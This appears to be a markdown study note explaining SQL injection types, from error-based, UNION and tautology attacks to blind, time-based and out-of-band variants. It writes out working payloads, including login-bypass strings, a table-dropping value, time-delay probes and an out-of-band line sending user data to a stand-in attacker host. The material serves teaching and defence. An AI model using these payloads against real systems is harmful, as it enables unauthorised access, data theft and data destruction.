# SQL injection types

- Types include
  - [In-band SQL injection](#in-band-sql-injection)
  - [Blind SQL injection](#blind-sql-injection)
  - [Out-of-band SQL injection](#out-of-band-sql-injection)
- Other classifications sometimes include
  - **Database management system-specific SQL injection**
    - Using specific SQL statements to certain database engine.
  - **Compounded SQL injection**
    - Combining SQL injection with other web application attacks such as • insufficient authentication • DDoS attacks • DNS hijacking • XSS.
    - E.g. DDoSing through `http://cloudarchitecture.io/azure?id=2 and WAITFOR DELAY '0:0:50'`
  - **Second-order SQL injection**
    - When user-supplied data is stored by the application and later incorporated into SQL queries in an unsafe way.
    - E.g. during login user name and password is retrieved as `WHERE username="$username" and password="$password"`, one could then set a password as `"); drop table users;` to delete the table and it will only executed during user login.

## In-band SQL injection

- Also known as • **classic SQL injection** • **in-band SQLi** • **classic SQLi**.
- Attacker uses one channel to inject malicious queries and retrieve results.

### Error-based SQL injection

- Causing database to throw errors and in such a way to identify the vulnerabilities
- One of the most common injections
- Examples
  - Through parameter tampering in GET/POST requests
    - E.g. adding `′` in the end: `http://testphp.vulnweb.com/listproducts.php?cat=1′`
      - Shows error: `Error: Check the manual that corresponds to your MySQL server version. Invalid syntax "' at line 1 Warning: mysql_fetch_array() expects parameter 1 to be resource, boolean given in /hj/var/www/listproducts.php on line 74`
      - Reveals file names, database type etc.
    - Can use e.g. [Burp Suite](./../05-vulnerabilities/vulnerability-analysis.md#burp-suite)
  - Converting anything to integer: `or 1=convert(int, (select * from tablename))`
    - `Syntax error converting the nvarchar value '<sql execution result>'`

### System stored procedure

- **Stored procedure**: Precompiled function-like SQL statements supported by many DBMS.
- Injecting malicious queries into stored procedures
- E.g. `@vname` is vulnerable to injection in following procedure:

  ```sql
    CREATE PROCEDURE getDescription
      @vname VARCHAR(50)
    AS
      EXEC('SELECT description FROM products WHERE name = '''+@vname+ '''')
    RETURN
  ```

### Illegal/Logically incorrect query

- Goal is to gather information about the type and structure of the back-end database.
- Considered as a preliminary step for further attacks.
- Attacker takes advantage of error messages sent by the database on incorrect queries.
- Often exposes the names of tables and columns.
- E.g. `SELECT*FROM table_nameWHERE id=@id"` (missing whitespaces) would cause incorrect syntax error.

### UNION SQL injection

- 📝 Using the `UNION` operator to inject a malicious query.
- Allows appending results to the original query.
- E.g. `SELECT a, b FROM table1 UNION SELECT c, d FROM table2`

### Tautology

- Manipulating the `WHERE` operator in the query to always have a `true` value
- 📝 Utilizes `OR` operator e.g. by appending `OR 1 = 1`
- E.g. `select * from user_details where userid = 'abcd' and password = 'anything' or 'x'='x'`
- 🤗 In logic, a tautology is a formula which is true in every possible interpretation
  - E.g. either it will rain tomorrow, or it won't rain

### Comment SQL injection

#### End-of line comment

- Also known as • **terminating query** • **single-line comment** • ***end-of-line comment** • **end of line comment**.
- 📝 Usually done by adding `--` at the end of the injected query
  - `--` (two dashes): comment out the rest so SQL engine ignores the rest of the query
- E.g. by appending `' or 1 = 1 --` in the end of the query would ignore the password check
  - `select * from users where name='injection starts here' or 1=1 --' AND password='pwd'`
  - Basically tells the server if 1 = 1 (always true) to allow the login.
  - Double dash (--) tells the server to ignore the rest of the query

#### Inline comments

- Using C-style comments to eliminate a part of the query.
- Requires attacker having a good idea of how the input is integrated.
- E.g.
  - Query is

    ```sql
      $sql = "INSERT INTO members (username, isadmin, password) VALUES ('".$username."', 0, '".$password."')"
    ```

  - Attackers input include `username` and `password`
  - Attacker enters following values to avoid password check:
    - `attacker', 1, /*`
    - `*/'pwd`
  - It then generate:

    ```sql
      INSERT INTO members (username, isadmin, password) VALUES ('attacker', 1, /*', 0, '*/'pwd')
    ```

### Piggyback query

- Also known as • **piggybacked query** • **piggy-backed query** • **statement injection**
- Appending malicious query to the end of the original one.
- Common way is to append the query delimiter (`;`)
  - E.g. `normal SQL statement + ";" + INSERT (or UPDATE, DELETE, DROP) <rest of injected query>`

## Blind SQL injection

- Also known as • **blind SQLi** • **inferential SQL injection** • **inferential SQLi** • **inference SQL injection** • **inference SQLi**
- Attacker is unable to see the direct results of the injected queries
  - instead attacker observes web applications response and behavior.
- As database does not output data to the web page, an attacker is forced to steal data by asking the database a series of true or false questions.
- Allows remote database fingerprinting to e.g. know which type of database is in use
- Can be automated using e.g.
  - [Absinthe :: Automated Blind SQL Injection](https://github.com/cameronhotchkies/Absinthe)
  - [SQLBrute](https://securiteam.com/tools/5IP0L20I0E), multi threaded blind SQL injection bruteforcer in Python
  - [bsqlbf](https://code.google.com/archive/p/bsqlbf-v2/), a blind SQL injection tool in Perl

### Boolean-based blind SQL

- Also called **content-based blind SQL**
- Attacker forms queries to return `true` or `false`
- Depends on changing HTTP results depending on SQL results for each condition.
- Allows enumerating the database character by character (slow)
- E.g.
  - URL: `http://newspaper.com/items.php?id=2`
  - Query in back-end: `SELECT title, description, body FROM items WHERE ID = 2`
  - Attacker sends `http://newspaper.com/items.php?id=2 and 1=2` to make it return `false`
  - Attacker inspects if application shows a page or with which status code

### Time-based SQL injection

- Also called • **time delay SQL injection** • **double blind SQL injection** • **2blind SQL injection**
- 📝 Using time delay to evaluate the result (true or false) of the malicious query
- Allows for testing of existing vulnerabilities.
- Uses commands like `waitfor`, `sleep`, `benchmark`
  - Helps with database fingerprinting as MySQL, MSSQL, and Oracle have different functions to get current time.
  - E.g. `http://www.site.com/vulnerable.php?id=1' waitfor delay '00:00:10'--`
- Allows enumerating each character (very slow)
  - E.g. if database name starts with A, wait 10 seconds
  - Can use character comparison, regex or `LIKE` in Microsoft SQL.
- Time consuming, but there are automated tools such as [`sqlmap`](http://sqlmap.org/)

#### Heavy query

- Injecting queries that takes time to test
- Useful when time functions such as `waitfor` are disabled by administrator
- E.g. `SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C`
  - Can inject something like: `1 AND 1>(SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C)`

## Out-of-band SQL injection

- Also known as • **OOB injection** • **OOB SQLi**
- Exhilarate data through outbound channel
  - E.g. e-mail sending or file writing/reading functionalities
- Difficult as it depends on target having
  - Supported databases that can initiate outbound DNS or HTTP requests
  - Lack of input validation
  - Network access to the database server
  - Privileges execute the necessary function
- E.g. `||UTL_HTTP.request('http://test.attacker.com/'||(SELECT user FROM users))`
